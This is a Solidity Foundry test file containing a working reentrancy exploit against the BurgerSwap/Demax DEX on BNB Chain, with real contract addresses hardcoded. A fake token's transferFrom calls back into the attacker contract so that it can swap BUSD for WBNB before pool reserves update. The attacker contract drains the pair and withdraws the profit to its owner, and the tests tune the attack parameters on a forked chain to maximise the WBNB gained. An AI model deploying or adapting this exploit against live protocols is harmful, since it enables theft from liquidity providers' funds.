// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";

interface IWBNB {
    function deposit() external payable;
    function withdraw(uint256) external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IDemaxPlatform {
    function swapExactTokensForTokens(
        uint256 amountIn, uint256 amountOutMin,
        address[] calldata path, address to, uint256 deadline
    ) external returns (uint256[] memory);
    function swapPrecondition(address) external view returns (bool);
    function existPair(address, address) external view returns (bool);
    function DGAS() external view returns (address);
}

interface IDemaxDelegate {
    function addLiquidity(
        address tokenA, address tokenB,
        uint256 amountA, uint256 amountB,
        uint256 amountAMin, uint256 amountBMin,
        uint256 deadline
    ) external returns (uint256, uint256, uint256);
}

interface IDemaxPair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

contract FakeTokenV5 {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "FAKEV5";
    string public symbol = "FAKEV5";
    uint8 public decimals = 18;

    address public exploiter;
    bool public callbackEnabled;

    constructor(address _exploiter) {
        exploiter = _exploiter;
        totalSupply = 1e30;
        balanceOf[_exploiter] = totalSupply;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount);
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function enableCallback() external {
        require(msg.sender == exploiter);
        callbackEnabled = true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (from != exploiter) {
            require(allowance[from][msg.sender] >= amount);
            allowance[from][msg.sender] -= amount;
        }
        require(balanceOf[from] >= amount);
        balanceOf[from] -= amount;
        balanceOf[to] += amount;

        if (callbackEnabled) {
            callbackEnabled = false;
            BurgerMultiExploit4(payable(exploiter)).onReentrancy();
        }
        return true;
    }
}

contract BurgerMultiExploit4 {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BURGER = 0xAe9269f27437f0fcBC232d39Ec814844a51d6b8f;
    address constant PLATFORM = 0xBf6527834dBB89cdC97A79FCD62E6c08B19F8ec0;

    address public owner;
    FakeTokenV5 public fakeToken;
    address public reentryToken;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    // The reentrancy approach for BUSD/WBNB:
    // 1. We have BUSD from buying with WBNB
    // 2. Create FakeToken/BURGER pair (swapPrecondition)
    // 3. Create FakeToken/BUSD pair
    // 4. Seed BURGER/WBNB with enough WBNB so DGAS check passes
    // 5. Outer swap: FakeToken -> BUSD -> WBNB
    //    During FakeToken transferFrom to FakeToken/BUSD pair, reentrancy:
    //    Reentrant swap: BUSD -> WBNB (using our BUSD balance)
    //    This drains WBNB from the BUSD/WBNB pair before outer swap adjusts reserves
    // 6. Outer swap continues with inflated reserves -> we get extra WBNB

    function fullAttack(
        address targetToken,
        uint256 wbnbForBuy,
        uint256 seedWbnb,
        uint256 pairPct
    ) external {
        require(msg.sender == owner);

        fakeToken = new FakeTokenV5(address(this));

        IWBNB(WBNB).approve(PLATFORM, type(uint256).max);
        IERC20(targetToken).approve(PLATFORM, type(uint256).max);
        IERC20(BURGER).approve(PLATFORM, type(uint256).max);
        fakeToken.approve(PLATFORM, type(uint256).max);

        // Seed BURGER/WBNB pair (buy BURGER with WBNB)
        if (seedWbnb > 0) {
            address[] memory path = new address[](2);
            path[0] = WBNB;
            path[1] = BURGER;
            IDemaxPlatform(PLATFORM).swapExactTokensForTokens(
                seedWbnb, 0, path, address(this), block.timestamp + 3600
            );
        }

        // Buy targetToken
        {
            address[] memory path = new address[](2);
            path[0] = WBNB;
            path[1] = targetToken;
            IDemaxPlatform(PLATFORM).swapExactTokensForTokens(
                wbnbForBuy, 0, path, address(this), block.timestamp + 3600
            );
        }

        uint256 tokenBal = IERC20(targetToken).balanceOf(address(this));
        uint256 forPair = tokenBal * pairPct / 100;

        // Buy more BURGER for pair creation (1 WBNB)
        {
            address[] memory path = new address[](2);
            path[0] = WBNB;
            path[1] = BURGER;
            IDemaxPlatform(PLATFORM).swapExactTokensForTokens(
                1 ether, 0, path, address(this), block.timestamp + 3600
            );
        }

        uint256 burgerBal = IERC20(BURGER).balanceOf(address(this));

        // Create FakeToken/BURGER pair (for swapPrecondition)
        IDemaxDelegate(PLATFORM).addLiquidity(
            address(fakeToken), BURGER,
            100 ether, burgerBal, 0, 0, block.timestamp + 3600
        );

        // Create FakeToken/targetToken pair
        IDemaxDelegate(PLATFORM).addLiquidity(
            address(fakeToken), targetToken,
            100 ether, forPair, 0, 0, block.timestamp + 3600
        );

        // Setup reentrancy
        reentryToken = targetToken;

        // Attack: FakeToken -> targetToken -> WBNB
        fakeToken.enableCallback();
        {
            address[] memory path = new address[](3);
            path[0] = address(fakeToken);
            path[1] = targetToken;
            path[2] = WBNB;
            IDemaxPlatform(PLATFORM).swapExactTokensForTokens(
                50 ether, 0, path, address(this), block.timestamp + 3600
            );
        }
    }

    function onReentrancy() external {
        require(msg.sender == address(fakeToken));
        uint256 tokenBal = IERC20(reentryToken).balanceOf(address(this));
        if (tokenBal > 0) {
            address[] memory path = new address[](2);
            path[0] = reentryToken;
            path[1] = WBNB;
            IDemaxPlatform(PLATFORM).swapExactTokensForTokens(
                tokenBal, 0, path, address(this), block.timestamp + 3600
            );
        }
    }

    function withdrawAll() external {
        require(msg.sender == owner);
        uint256 wbnbBal = IWBNB(WBNB).balanceOf(address(this));
        if (wbnbBal > 0) IWBNB(WBNB).withdraw(wbnbBal);
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }
}

contract BurgerMultiTest4 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;

    function test_busd_optimized() public {
        address att = makeAddr("att");
        vm.deal(att, 2000 ether);
        vm.startPrank(att);

        BurgerMultiExploit4 e = new BurgerMultiExploit4();
        IWBNB(WBNB).deposit{value: 1500 ether}();
        IWBNB(WBNB).transfer(address(e), 1500 ether);

        uint256 wbnbBefore = IWBNB(WBNB).balanceOf(address(e));
        emit log_named_uint("WBNB before", wbnbBefore);

        // seedWbnb=20, wbnbForBuy=200 (buy lots of BUSD), pairPct=5 (small fake pair)
        e.fullAttack(BUSD, 200 ether, 20 ether, 5);

        uint256 wbnbAfter = IWBNB(WBNB).balanceOf(address(e));
        emit log_named_uint("WBNB after", wbnbAfter);
        emit log_named_int("WBNB delta", int256(wbnbAfter) - int256(wbnbBefore));
        vm.stopPrank();
    }

    // Try with varying seed amounts to find minimum needed
    function test_busd_minimal_seed() public {
        address att = makeAddr("att");
        vm.deal(att, 2000 ether);
        vm.startPrank(att);

        BurgerMultiExploit4 e = new BurgerMultiExploit4();
        IWBNB(WBNB).deposit{value: 1500 ether}();
        IWBNB(WBNB).transfer(address(e), 1500 ether);

        uint256 wbnbBefore = IWBNB(WBNB).balanceOf(address(e));
        emit log_named_uint("WBNB before", wbnbBefore);

        // Try seed=5 WBNB, buy=100 BUSD, pairPct=10
        e.fullAttack(BUSD, 100 ether, 5 ether, 10);

        uint256 wbnbAfter = IWBNB(WBNB).balanceOf(address(e));
        emit log_named_uint("WBNB after", wbnbAfter);
        emit log_named_int("WBNB delta", int256(wbnbAfter) - int256(wbnbBefore));
        vm.stopPrank();
    }
}
